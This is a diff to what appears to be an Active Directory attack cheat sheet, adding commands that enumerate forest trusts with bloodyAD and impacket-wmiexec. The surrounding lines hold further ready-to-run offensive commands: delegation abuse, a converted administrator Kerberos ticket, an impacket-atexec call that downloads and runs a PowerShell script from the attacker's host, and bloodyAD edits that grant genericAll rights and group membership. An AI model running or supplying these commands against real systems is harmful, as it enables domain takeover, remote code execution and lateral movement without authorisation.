@@ -724,6 +724,10 @@ Get-DomainComputer DC_COMPUTER_NAME | Set-DomainObject -Set @{'msds-allowedtoact
 kirbi2ccache doIGfjCCBnqgAwIBB<SNIP>BASE64 HERE... administrator administrator.ccache;
 kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:139/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 
++---------- Forest Trust ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get trusts
+impacket-wmiexec -dc-ip $TARGET $DC -k -no-pass "powershell -c \"Import-Module 'ActiveDirectory'; Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -Properties * | Select-Object name,objectguid,securityIdentifier\""
+
 +---------- Add ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' 'USER'
